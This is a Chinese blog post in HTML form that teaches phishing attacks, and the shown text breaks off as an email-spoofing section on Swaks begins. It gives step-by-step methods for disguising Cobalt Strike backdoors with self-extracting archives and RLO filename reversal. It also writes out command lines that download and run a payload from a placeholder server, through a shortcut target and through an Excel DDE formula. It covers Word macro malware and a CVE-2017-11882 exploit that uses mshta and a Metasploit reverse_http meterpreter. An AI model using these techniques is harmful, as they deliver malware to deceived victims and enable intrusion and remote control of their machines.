+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710174336-3dc88b54-1f06-1.png">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710174342-41a2f188-1f06-1.png">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710180801-a71f82bc-1f09-1.png">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710174353-47ed9020-1f06-1.png">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710174359-4bd46e2a-1f06-1.png">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710174659-b6ab700e-1f06-1.png">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710174704-ba1d289a-1f06-1.png">
+<meta property="article:published_time" content="2024-06-26T16:49:14.000Z">
+<meta property="article:modified_time" content="2024-11-01T06:42:12.372Z">
+<meta property="article:author" content="神楽">
+<meta property="article:tag" content="社工">
+<meta property="article:tag" content="钓鱼">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://helloworldbugs.gitlab.io/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710171109-b5868060-1f01-1.png">
+  
+  
+  
+  <title>一文就学会网络钓鱼“骚”姿势 - 神楽的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"helloworldbugs.gitlab.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":50,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>神楽的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/guidao.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="一文就学会网络钓鱼“骚”姿势"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-06-27 00:49" pubdate>
+          2024年6月27日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          25 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">一文就学会网络钓鱼“骚”姿势</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2024年11月1日 下午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="一、什么是网络钓鱼"><a href="#一、什么是网络钓鱼" class="headerlink" title="一、什么是网络钓鱼"></a><strong>一、什么是网络钓鱼</strong></h2><p>网络钓鱼是通过伪造银行或其他知名机构向他人发送垃圾邮件，意图引诱收信人给出敏感信息(如用户名、口令、帐号 ID 、 ATM PIN 码或信用卡详细信息)的一种攻击方式。</p>
+<h2 id="二、网络钓鱼的基本流程"><a href="#二、网络钓鱼的基本流程" class="headerlink" title="二、网络钓鱼的基本流程"></a><strong>二、网络钓鱼的基本流程</strong></h2><p>钓鱼一般分为三个步骤：寻找大鱼，制作鱼饵和抛竿</p>
+<p>寻找大鱼：我们的目标一般包括： HR、销售、文员等安全意识比较薄弱的人员，以及运维、开发等掌握重要资源的人员。</p>
+<p>制作鱼饵：一个高质量鱼饵一般分为两部分，一个是邮件内容更加的逼真可信，另一个是邮件的附件尽可能伪装的正常</p>
+<p>抛竿：最后把鱼竿抛出后就可以坐等鱼上钩了</p>
+<h2 id="三、如何制作高质量鱼饵"><a href="#三、如何制作高质量鱼饵" class="headerlink" title="三、如何制作高质量鱼饵"></a><strong>三、如何制作高质量鱼饵</strong></h2><h3 id="0x01-自解压-RLO"><a href="#0x01-自解压-RLO" class="headerlink" title="0x01.自解压+RLO"></a><strong>0x01.自解压+RLO</strong></h3><p>制作思路：利用自解压文件的特性，解压后令其自动执行解压出来的文件，达到上线的目的，由于自解压文件后缀为exe，很容易被识破，所以我们还需使用RLO后缀反转进行一些伪装。</p>
+<p>步骤一：用cs生成windows后门</p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710171109-b5868060-1f01-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>步骤二：随便准备一张图片，使用WinRAR把后门和图片一块自解压</p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710171122-bd3837f4-1f01-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>压缩文件时需在高级——自解压选项中进行一些的设置使木马的执行更加隐蔽：</p>
+<p>常规——解压路径：C:\windows\temp</p>
+<p>设置——解压后运行：C:\windows\temp\artifact.exe</p>
+<p>C:\windows\temp\壁纸.jpg</p>
+<p>模式——全部隐藏</p>
+<p>更新——更新模式——解压并更新文件</p>
+<p>更新——覆盖模式——覆盖所有文件</p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710171155-d0b6712e-1f01-1.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710171212-db0f7cf6-1f01-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>步骤三：使用resourcehacker更换文件图标,将其伪装成图片</p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710171324-061fa934-1f02-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>步骤四：把文件重命名为壁纸gpj.exe，再使用RLO对后缀进行反转，最后效果如下</p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710171405-1e5ff17a-1f02-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>结合邮件钓鱼等方式把“图片”放送给他人，引诱他人上钩</p>
+<p>对方双击“图片”后，会同时执行artifact.exe和壁纸.jpg，而且上线cs</p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710171829-bbbbd2ea-1f02-1.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="0x02-快捷方式"><a href="#0x02-快捷方式" class="headerlink" title="0x02.快捷方式"></a><strong>0x02.快捷方式</strong></h3><p>制作思路：运行快捷键方式时，执行命令让其下载我们提前放在服务器上的后门程序并且运行</p>
+<p>步骤一：cs生成后门，放到服务器网站目录下  
+ </p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710171426-2aee8424-1f02-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>步骤二：创建快捷方式，在目标中写入以下代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">C:\Windows\System32\cmd.exe /k curl http://xxx.xxx.xxx.xxx/exe/artifact.exe --output C:\Windows\temp\win.exe &amp;&amp; C:\Windows\temp\win.exe<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710171449-388e1c70-1f02-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>步骤三：更换图标，增加其真实性  
+ </p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710171506-42ae8942-1f02-1.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710171944-e831fafc-1f02-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>当对方双击快捷键方式时就会下载我们准备好的artifact.exe并且执行</p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710172007-f61095de-1f02-1.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="0x03-Word宏病毒"><a href="#0x03-Word宏病毒" class="headerlink" title="0x03.Word宏病毒"></a><strong>0x03.Word宏病毒</strong></h3><p>宏病毒是Word中被嵌入的带有恶意行为的宏代码（VBA代码），当我们双击打开带有宏病毒的word文档的时候它的宏代码会自动运行。</p>
+<p>步骤一：使用cs生成恶意vba代码</p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710172829-21845e70-1f04-1.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710172840-27d71380-1f04-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>步骤二：新建doc文档，创建宏，保存即可</p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710172906-378785d0-1f04-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>步骤三：再次打开文件后提示是否启用宏，点击启用就会上线cs</p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710172929-44ef6c9c-1f04-1.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710172947-4fa4658e-1f04-1.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="0x04-Excel注入"><a href="#0x04-Excel注入" class="headerlink" title="0x04.Excel注入"></a><strong>0x04.Excel注入</strong></h3><p>Excel注入是一种将包含恶意命令的excel公式插入到可以导出csv或xls等格式的文本中，当在excel中打开xls文件时，文件会转换为excel格式并提供excel公式的执行功能，从而造成命令执行。</p>
+<p><strong>利用excel注入弹出计算器</strong></p>
+<p>注入代码：<code>=cmd| &#39;/c calc&#39;! &#39;!A1&#39;</code></p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173033-6b0ceb16-1f04-1.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173041-700b042c-1f04-1.png" srcset="/img/loading.gif" lazyload></p>
+<p><strong>利用excel注入上线cs</strong></p>
+<p>步骤一：使用cs生成exe后门，并放到服务器上</p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173056-790edf6c-1f04-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>步骤二：更换恶意代码</p>
+<p><code>=cmd| &#39;/c curl http://xxx.xxx.xxx.xxx/beacon.exe --output C:\Windows\temp\win.exe &amp;&amp; C:\Windows\temp\win.exe&#39; ! &#39;A1&#39;</code></p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173202-a06f2b84-1f04-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>当双击打开该excel时就会执行恶意代码下载cs后门并运行 ，上线cs</p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173211-a5bac094-1f04-1.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="0x05-CVE-2017-11882"><a href="#0x05-CVE-2017-11882" class="headerlink" title="0x05.CVE-2017-11882"></a><strong>0x05.CVE-2017-11882</strong></h3><p>cve-2017-11882漏洞也是word钓鱼的一种方式，相比宏病毒更加的隐蔽，把word伪装成某某通知文件，目标点击后就直接可以直接上线。</p>
+<p>利用cve-2017-11882弹出计算器：</p>
+<p>下载poc：<a target="_blank" rel="noopener" href="https://github.com/Ridter/CVE-2017-11882">https://github.com/Ridter/CVE-2017-11882</a></p>
+<p>生成带有病毒的word文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">python2 Command109b_CVE-2017-11882.py -c &quot;cmd.exe /c calc.exe&quot; -o test.doc<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173332-d5d526f2-1f04-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>双击test.doc，弹出计算器</p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173352-e205e7a4-1f04-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>利用cve-2017-11882上线msf</p>
+<p>步骤一：使用exploit&#x2F;windows&#x2F;misc&#x2F;hta_server生成病毒</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">use exploit/windows/misc/hta_server<br>set payload windows/meterpreter/reverse_http<br>set lport 4444<br>show options<br>exploit<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173413-ee731a70-1f04-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>步骤二：生成带病毒的doc文件并伪装为通知文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">python2 Command109b_CVE-2017-11882.py -c &quot;mshta http://192.168.126.132:8080/Uf7DGFz.hta&quot; -o 通知文件.doc -i input.rtf<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173510-108ae110-1f05-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>受害人打开word，msf就会上线shell</p>
+<p><img src="/2024/06/27/%E7%BD%91%E5%AE%89/%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5/%E4%B8%80%E6%96%87%E5%B0%B1%E5%AD%A6%E4%BC%9A%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E2%80%9C%E9%AA%9A%E2%80%9D%E5%A7%BF%E5%8A%BF/20230710173522-17c2501c-1f05-1.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="四、邮件伪造"><a href="#四、邮件伪造" class="headerlink" title="四、邮件伪造"></a><strong>四、邮件伪造</strong></h2><p><strong>Swaks</strong></p>
+<p>Swaks是kali自带的一款邮件伪造工具，通过swaks可以向任意目标发送任意内容的邮件</p>
